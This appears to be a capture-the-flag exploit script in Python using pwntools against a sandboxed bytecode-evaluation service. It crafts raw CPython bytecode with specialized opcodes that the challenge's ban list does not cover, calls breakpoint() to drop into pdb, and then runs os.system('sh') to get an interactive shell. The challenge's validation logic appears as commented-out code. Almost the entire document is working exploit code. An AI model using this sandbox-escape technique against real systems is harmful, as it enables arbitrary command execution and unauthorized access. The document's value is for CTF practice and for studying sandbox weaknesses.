#!/usr/bin/env python3
import opcode
from pwn import remote
cod = bytes([
        # LOAD_FAST__LOAD_CONST does both in one instruction
        # LOAD_FAST 40 reaches into frame->localsplus and retrieves "builtins" which was loaded previously before the eval
        # the 255 is to prevent banned, then LOAD_CONST 0 loads "breakpoint"
        # 84, 40, 255, 0,
        86, 40, 255, 0,
        # pops both, loads builtins["breakpoint"] 
        19, 0, 255, 0,

        # LOAD __call__ attribute
        76, 1, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 255, 0, 

        # CALL_PY_EXACT_ARGS works without segfaulting now because its a method call
        23, 0, 255, 0, 255, 0, 255, 0,
        
        # Error after
        255, 0,
    ])

# name = input("name? ")
name = b'__call__'
# const = input("const? ")
const = b'breakpoint'
print(cod.hex(), len(cod), name, const)

# for i in range(64):
#     r = remote('localhost', 5000, level='error')

#     codeedit = bytearray(cod)
#     codeedit[3] = i
#     # print(codeedit.hex())
#     r.sendlineafter(b'code? ', codeedit.hex().encode())
#     r.sendlineafter(b'name? ', name)
#     r.sendlineafter(b'const? ', const)

#     try:
#         print(i, r.recvline())
#     except:
#         pass
#     # r.interactive()
#     r.close()

r = remote('localhost', 5000, level='error')

codeedit = bytearray(cod)
r.sendlineafter(b'code? ', codeedit.hex().encode())
r.sendlineafter(b'name? ', name)
r.sendlineafter(b'const? ', const)

r.sendlineafter(b'(Pdb) ', b'__import__("os").system("sh")')

r.interactive()

# if len(cod) > 100 or len(cod) % 2 != 0 or len(name) > 25 or len(const) > 25:
#     print("your code looks bad :(")
#     exit(1)

# # can't hack me if I just ban every opcode
# banned = set(opcode.opmap.values())
# for i in range(0, len(cod), 2):
#     [op, arg] = cod[i:i + 2]
#     if op in banned:
#         print("your code is sus >:(")
#         # exit(1)
#     if arg > 64:
#         print("I can't count that high >:(")
#         exit(1)

# def f():
#     pass

# f.__code__ = f.__code__.replace(co_code=cod, co_names=(name,), co_consts=(const,))

# eval(f.__code__, {'__builtins__': {}}, {'__builtins__': {}})